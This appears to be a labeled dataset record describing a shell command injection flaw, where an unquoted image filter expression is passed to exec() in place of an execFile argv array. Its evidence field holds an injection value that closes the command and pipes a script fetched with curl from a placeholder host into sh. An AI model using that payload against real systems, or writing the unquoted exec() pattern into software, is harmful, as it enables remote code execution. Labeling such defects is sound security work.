title: Image filter expression passed to exec for shell evaluation

labels.defect: Shell command injection: user-composed filter expression interpolated into an exec() command line
labels.evidence: Reproducible: filter="x; curl https://example.invalid/s.sh | sh; #" terminates the quoted command and runs the fetched script as the service user; exec() always spawns a shell, unlike the base execFile array form.

adjudication.notes: execFile argv array switched to exec() with unquoted user-composed filter interpolated: trivial shell injection absent in base.
